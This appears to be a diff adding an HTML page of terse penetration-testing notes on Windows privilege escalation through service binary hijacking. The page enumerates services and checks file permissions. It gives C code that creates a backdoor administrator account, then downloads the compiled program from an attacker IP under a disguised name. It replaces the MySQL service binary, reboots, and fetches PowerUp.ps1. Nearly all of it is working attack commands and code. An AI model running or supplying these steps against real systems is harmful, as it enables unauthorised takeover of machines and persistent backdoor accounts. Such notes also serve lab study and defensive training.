@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Leveraging Windows Services</title>
+</head><body>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} <br/>
+<br/>
+icacls "C:\xampp\apache\bin\httpd.exe" {to check permissions}<br/>
+<br/>
+<br/>
+<br/>
+&nbsp;#include &lt;stdlib.h&gt; int main () { int i; i = system ("net user dave2 password123! /add"); i = system ("net localgroup administrators dave2 /add"); return 0; } &nbsp; &nbsp;{script to add user}<br/>
+<br/>
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe &nbsp;{cross simpler}<br/>
+<br/>
+iwr -uri http://192.168.45.175:8000/adduser.exe -Outfile auditTracker.exe<br/>
+<br/>
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} {check start permissions}<br/>
+<br/>
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe<br/>
+<br/>
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe<br/>
+<br/>
+whoami /priv<br/>
+<br/>
+shutdown /r /t 0 &nbsp;{reboot the machine}<br/>
+<br/>
+runas /user:backupadmin cmd<br/>
+<br/>
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .<br/>
+<br/>
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1<br/>
+<br/>
+</body></html>
